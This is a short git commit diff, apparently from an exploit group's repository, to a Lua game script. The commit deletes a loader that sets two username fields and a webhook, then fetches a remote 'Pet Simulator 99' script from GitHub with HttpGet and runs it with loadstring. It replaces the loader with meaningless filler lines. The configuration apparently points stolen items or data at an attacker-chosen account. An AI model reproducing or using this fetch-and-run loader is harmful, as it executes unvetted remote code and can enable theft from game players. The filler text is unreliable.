a42a4327d341e1434c624d30e489697430e9720d
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 17:36:39 +0200

    Mass update kyutjyhrdgfs.lua

--- scripts/kyutjyhrdgfs.lua
+++ scripts/kyutjyhrdgfs.lua
@@ -1,7 +1,4 @@
+skibidi toiler
+nb
 
-Username = "gfds"
-Username2 = "jhgfsdas"
-Webhook = "kutjyhregfsda"
-
--- The rest of the code stays constant, and only the three fields above are updated dynamically
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
+ok no mb
